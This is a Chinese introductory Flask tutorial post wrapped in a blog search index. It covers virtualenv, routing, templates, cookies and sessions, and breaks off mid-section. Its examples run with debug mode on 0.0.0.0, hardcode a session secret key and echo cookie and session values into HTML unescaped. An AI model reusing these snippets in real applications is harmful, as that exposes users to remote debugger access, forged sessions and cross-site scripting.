<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>初识Flask</title>
      <link href="/2020/03/25/%E5%88%9D%E8%AF%86Flask/"/>
      <url>/2020/03/25/%E5%88%9D%E8%AF%86Flask/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.loli.net/2020/03/26/dlSXA7RbUqCQtPe.png" alt="flask-icon.png"></p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Flask是一个用Python编写的Web应用程序框架。 它由 <strong>Armin Ronacher</strong> 开发，他领导一个名为Pocco的国际Python爱好者团队。 Flask基于Werkzeug WSGI工具包和<a href="http://docs.jinkan.org/docs/jinja2/" target="_blank" rel="noopener">Jinja2</a>模板引擎。两者都是Pocco项目。</p><p><a href="https://dormousehole.readthedocs.io/en/latest/" target="_blank" rel="noopener">Flask中文文档</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Python2.7及以上，Python3.4及以上，我这里用的Python2.7</p><p><strong>安装virtualenv</strong></p><p>virtualenv可以创建一个独立的python运行环境，这个环境和系统的python环境是互不干扰的，也就是说你在这个环境中安装的python包不会安装到系统的python环境中，系统python环境中的包会复制到这个环境中（但新版本的virtualenv并不会复制过来，默认只安装<code>setuptools</code>，<code>wheel</code>和<code>pip</code>）</p><p>当然如果不想用系统的包的话可以加一些参数：</p><p><code>–-no-site-packages</code>：表示在建立虚拟环境时不将原版本中的第三方库拷贝过来，这样就能获得一个纯净的Python环境。（可这个参数新版的virtualenv好像用不了，我的就是这样，但网上都这样讲，=.=）</p><p><code>--no-setuptools</code>：不安装setuptools；<code>--no-wheel</code>：不安装whell；<code>--no-pip</code>：不安装pip</p><p>安装virtualenv包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install virtualenv</span><br></pre></td></tr></table></figure><p>创建环境：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir Flask  #创建项目目录</span><br><span class="line">cd Flask</span><br><span class="line">virtualenv -p C:\Python2\python.exe E:\flask\venv  #在这个项目中创建一个独立的python环境，环境命名为venv，-p表示指定python的版本路径</span><br><span class="line">.\venv\Scripts\activate  #启动虚拟环境;deactivate可退出此环境</span><br></pre></td></tr></table></figure><p>接下来就要在这个虚拟环境中安装Flask了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\flask\venv\Scripts\python.exe -m pip list  #可看到当前虚拟环境中的所有的python包，当然不加路径也可以</span><br><span class="line">pip install Flask</span><br></pre></td></tr></table></figure><p>至此虚拟环境就搭建成功了，当然如果你不想用虚拟的python环境用系统自带的也可以</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask <span class="comment">#导入Flask模块</span></span><br><span class="line">app = Flask(__name__)<span class="comment">#使用当前模块作为参数</span></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><code>app.route(rule, options)</code>：该函数为<code>Flask</code>类的一个方法，告诉应用程序哪个URL应该调用相关的函数</p><ul><li><strong>rule</strong>：参数表示与该函数的URL绑定</li><li><strong>endpoint</strong>：被注册的url的名字，一般用来反向生成url的时候使用，默认把视图函数的名字作为endpoint，如:endpoint=”login”</li><li><strong>options</strong>：是要转发给基础Rule对象的参数列表。</li></ul><p>上面的<code>&#39;/&#39;</code>表示URL与hello_world函数绑定，在浏览器中打开web服务器的主页时，将呈现该函数的输出</p><p><code>app.run(host, port, debug, options)</code>：表示本地开发服务器上运行应用程序</p><ul><li><strong>host</strong>：要监听的主机名。 默认为127.0.0.1（localhost）。设置为“0.0.0.0”以使服务器在外部可用</li><li><strong>port</strong>：端口设置，默认值为5000</li><li><strong>debug</strong>：默认为false。 如果设置为true，则提供调试信息</li><li><strong>options</strong>：要转发到底层的Werkzeug服务器。</li></ul><p>浏览器访问<code>http://127.0.0.1:5000/</code>即可看到函数的输出</p><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment">#@app.route('/hello')  #添加路由</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World'</span></span><br><span class="line">app.add_url_rule(<span class="string">'/hello/'</span>,<span class="string">'hello'</span>,view_func=hello_world)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><code>app.add_url_rule(rule,endpoint,view_func,options)</code>：该方法与route类似</p><ul><li><strong>rule</strong>：一个字符串格式的url规则，如：”/login”</li><li><strong>endpoint</strong>：url规则的名字，用来反向生成url使用，默认是视图函数的名字。</li><li><strong>view_func</strong>：视图函数，当对应的endpoint名字被请求时需要调用的函数。</li><li><strong>options</strong>： 类似route时候的options，methods参数默认是只监听get</li></ul><h2 id="变量规则"><a href="#变量规则" class="headerlink" title="变量规则"></a>变量规则</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/hello/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello &#123; &#125;'</span>.format(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>在浏览器输入<code>http://127.0.0.1:5000/hello/flask</code>则会显示<code>Hello flask</code></p><p>除了默认字符串变量部分之外，还可以使用以下转换器构建规则：</p><ul><li><strong>int</strong>：接受整数，不为整数则404，<code>@app.route(&#39;/hello/&lt;int:name&gt;&#39;)</code></li><li><strong>float</strong>：接受浮点数，不为浮点数则404，<code>@app.route(&#39;/hello/&lt;float:name&gt;&#39;)</code></li><li><strong>path</strong>：接受用作目录分隔符的斜杠，<code>@app.route(&#39;/hello/&lt;path:name&gt;&#39;)</code></li></ul><h2 id="URL构建"><a href="#URL构建" class="headerlink" title="URL构建"></a>URL构建</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect, url_for</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/name')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_admin</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'hello Admin'</span></span><br><span class="line"><span class="meta">@app.route('/guest/&lt;guest&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_guest</span><span class="params">(guest)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'Hello &#123; &#125; as Guest'</span>.format(guest)</span><br><span class="line"><span class="meta">@app.route('/user/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_user</span><span class="params">(name)</span>:</span></span><br><span class="line">   <span class="keyword">if</span> name == <span class="string">'admin'</span>:</span><br><span class="line">       <span class="keyword">return</span> redirect(url_for(<span class="string">'hello_admin'</span>))<span class="comment">#redirect函数直接对route的路径进行访问，url_for直接对函数进行访问，一同使用则访问此路径下的函数</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">return</span> redirect(url_for(<span class="string">'hello_guest'</span>,guest = name))</span><br><span class="line">       </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><code>redirect(location, code=302, Response=None)</code>：该函数用来实现重定向功能</p><ul><li><strong>location</strong>：一个链接地址，可以使用url_for()函数得到，也可以是静态文件地址</li><li><strong>code</strong>：可以取值为301、302、303、305、307，默认302,300、304不可以</li><li><strong>Response</strong>：一个响应类，默认是werkzeug.wrappers.Response</li></ul><p>输入<code>http://127.0.0.1:5000/user/admin</code>则会302重定向到<code>http://127.0.0.1:5000/name</code>显示hello Admin</p><p><code>http://127.0.0.1:5000/user/flask</code>则会302重定向到<code>http://127.0.0.1:5000/guest/flask</code>，显示Hello flask as Guest</p><h2 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h2><p>首先创建一个HTML表单，使用POST方法将表单数据发送到URL，命名为login.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">"http://localhost:5000/login"</span> <span class="attr">method</span> = <span class="string">"post"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span>Enter Name:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"nm"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"submit"</span> <span class="attr">value</span> = <span class="string">"submit"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect, url_for, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/success/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">success</span><span class="params">(name)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'welcome &#123; &#125;'</span>.format(name)</span><br><span class="line"><span class="meta">@app.route('/login',methods = ['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">       user = request.form[<span class="string">'nm'</span>]  <span class="comment">#获取参数nm的值</span></span><br><span class="line">       <span class="keyword">return</span> redirect(url_for(<span class="string">'success'</span>,name = user))</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       user = request.args.get(<span class="string">'nm'</span>)</span><br><span class="line">       <span class="keyword">return</span> redirect(url_for(<span class="string">'success'</span>,name = user))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><strong>Request</strong>对象</p><ul><li><strong>Form</strong>：是一个字典对象,包含表单参数及其值的键和值对。</li><li><strong>args</strong>：解析查询字符串的内容，是包含表单参数对及其对应值对的列表的字典对象</li><li><strong>Cookies</strong>：保存Cookie名称和值的字典对象。</li><li><strong>files</strong>：与上传文件有关的数据。</li><li><strong>method</strong>：当前请求方法。</li></ul><p>输入flask回车后先跳转到<code>http://127.0.0.1:5000/login</code>然后自动POST一个nm参数后302重定向到<code>http://127.0.0.1:5000/success/flask</code>输出welcome flask</p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'&lt;h1&gt;Hello World&lt;/h1&gt;'</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>访问网站会得到一个Hello World标题，但这样吧标签插入在python代码中就很麻烦，于是这里就引入了<strong>Jinja2</strong>模板引擎，可以通过<strong>render_template()</strong>函数呈现HTML文件。</p><p>新建一个templates文件夹，在其中建立一个hello.html文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123; &#123;  marks &#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/hello/')</span></span><br><span class="line"><span class="meta">@app.route('/hello/&lt;score&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_name</span><span class="params">(score=None)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>,marks = score)<span class="comment">#自动寻找目录下的templates文件夹下的html文件</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>访问<code>http://127.0.0.1:5000/hello/flask</code>则会输出<code>Hello flask!</code>标题</p><p><strong>Jinja2</strong>模板引擎使用以下分隔符从HTML转义。</p><ul><li><strong>{ % … %}</strong>：用于语句</li><li><strong>{ {  … } }</strong>：用于表达式可以打印到模板输出</li><li><strong>{ # … # }</strong>：用于未包含在模板输出中的注释</li><li><strong># … ##</strong>：用于行语句</li></ul><p>另外测试语句效果，修改hello.html为以下内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line">&#123;% if marks&gt;50 %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> Your result is pass!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% else %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Your result is fail<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>脚本中<code>@app.route(&#39;/hello/&lt;score&gt;&#39;)</code>修改为<code>@app.route(&#39;/hello/&lt;int:score&gt;&#39;)</code></p><p>则当访问<code>http://127.0.0.1:5000/hello/1</code>时输出<code>Your result is fail</code></p><p>则当访问<code>http://127.0.0.1:5000/hello/100</code>时输出<code>Your result is pass!</code></p><p>注意这里必须要对传入的score定义为int型，否则会被当成字符串处理，就会一直输出<code>Your result is pass!</code></p><h2 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h2><p>hello.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> = <span class="string">"text/javascript"</span> </span></span><br><span class="line"><span class="tag">         <span class="attr">src</span> = <span class="string">"&#123; &#123;  url_for('static', filename = 'hello.js') &#125;&#125;"</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"button"</span> <span class="attr">onclick</span> = <span class="string">"sayHello()"</span> <span class="attr">value</span> = <span class="string">"Say Hello"</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>hello.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    alert(<span class="string">"Hello World"</span>)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">"hello.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>访问<code>http://127.0.0.1:5000/</code>点击Say Hello弹窗Hello World</p><h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect,url_for,request,render_template,make_response,escape,session</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"><span class="meta">@app.route('/setcookie',methods = ['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setcookie</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">       user = request.form[<span class="string">'nm'</span>]</span><br><span class="line">       resp = make_response(render_template(<span class="string">'readcookie.html'</span>))</span><br><span class="line">       resp.set_cookie(<span class="string">'userID'</span>,user)</span><br><span class="line">       <span class="keyword">return</span> resp</span><br><span class="line"><span class="meta">@app.route('/getcookie')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcookie</span><span class="params">()</span>:</span></span><br><span class="line">   name = request.cookies.get(<span class="string">'userID'</span>)</span><br><span class="line">   a = <span class="string">"&lt;h1&gt;welcome '&#123; &#125;'&lt;/h1&gt;"</span>.format(name)</span><br><span class="line">   <span class="keyword">return</span> a</span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.0.102:5000/setcookie"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Enter userID<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'text'</span> <span class="attr">name</span>=<span class="string">'nm'</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'submit'</span> <span class="attr">value</span>=<span class="string">'Login'</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>readcookie.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span>  <span class="attr">href</span>=<span class="string">"http://192.168.0.102:5000/getcookie"</span>&gt;</span>Click here to read cookie<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>首先在访问<code>http://127.0.0.1:5000/</code>传入flask，点击Click here to read cookie即可看到<code>welcome &#39;flask&#39;</code></p><h2 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h2><p>session是存储在服务器上的，会话是客户端登录到服务器并注销服务器的时间间隔。需要在该会话中保存的数据会存储在服务器上的临时目录中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect,url_for,request,render_template,make_response,escape,session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">'any random string'</span></span><br><span class="line"><span class="comment">#app.secret_key = os.urandom(12)</span></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        username = session[<span class="string">'username'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Logged in as '</span> + username + <span class="string">'&lt;br&gt;'</span> + <span class="string">"&lt;b&gt;&lt;a href = '/logout'&gt;click here to log out&lt;/a&gt;&lt;/b&gt;"</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"You are not logged in &lt;br&gt;&lt;a href = '/login'&gt;&lt;/b&gt;"</span> + <span class="string">"click here to log in&lt;/b&gt;&lt;/a&gt;"</span></span><br><span class="line"><span class="meta">@app.route('/login', methods = ['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        session[<span class="string">'username'</span>] = request.form[<span class="string">'username'</span>]</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''</span></span><br><span class="line"><span class="string">   &lt;form action = "" method = "post"&gt;</span></span><br><span class="line"><span class="string">      &lt;p&gt;&lt;input type = text name = username /&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">      &lt;p&gt;&lt;input type = submit value = Login /&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">   &lt;/form&gt;</span></span><br><span class="line"><span class="string">   '''</span></span><br><span class="line"><span class="meta">@app.route('/logout')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>,<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这里将session_key设置成了any random string</p><h2 id="重定向和错误"><a href="#重定向和错误" class="headerlink" 